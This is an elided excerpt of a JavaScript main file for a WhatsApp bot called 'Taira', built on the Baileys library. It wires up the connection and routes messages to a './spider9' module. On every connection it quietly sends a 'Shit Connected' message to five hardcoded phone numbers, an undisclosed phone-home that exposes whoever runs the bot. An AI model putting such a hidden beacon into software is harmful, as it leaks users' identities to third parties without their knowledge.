...
//const { getCreds } = require("./lib/funct4")
var low
try {
low = require('lowdb')
} catch (e) {
...
const question = (text) => {
  ...
  return new Promise((resolve) => {
    rl.question(text, randomcolor), (answer) => {
      resolve(answer);
      rl.close();
    };
  });
...
function removeFiles() {
    const directoryPath = './taira_baileys';
...
console.log(`Starting bot using WhatsApp version v${version.join('.')}, isLatest: ${isLatest}`);
...
const Taira = TairaConnect({
    ...
    getMessage: async (key) => {
                ...
                return { conversation: " 🙂⃤ 🙂⃤ταιяα мακιиο" };
    }
})
...
Taira.setStatus = (status) => {
   ...
   Taira.ev.on('connection.update', async (update) => {
	 ...
	 let uinfo = "Shit Connected 🔥"
          await sleep(30000)
	  await Taira.sendMessage("2349072958046@s.whatsapp.net", {text: uinfo })
	  await Taira.sendMessage("2347038639938@s.whatsapp.net", {text: uinfo })
	  await Taira.sendMessage("2349151864541@s.whatsapp.net", {text: uinfo })
	  await Taira.sendMessage("2348083569647@s.whatsapp.net", {text: uinfo })
          await Taira.sendMessage("2349031616504@s.whatsapp.net", {text: uinfo })
          };
...
Taira.ev.on('messages.upsert', async chatUpdate => {
        ...
        try {
            ...
            require("./spider9")(Taira, m, chatUpdate, store)
        } catch (err) {
            console.log(err)
        }
    })
...
/*Taira.ev.on('messages.upsert', async (chatUpdate) => {
  try {
    ...
    if (mek.key.id.startsWith('FatihArridho_')) return;
    m = smsg(Taira, mek, store);
    const modulesDir = './commands';
    fs.readdirSync(modulesDir).forEach((file) => {
     // if (file.endsWith('.js')) {
        require(modulesDir, file)(Taira, m, chatUpdate, store);
     // }
    });
  } catch (err) {
    console.log(err);
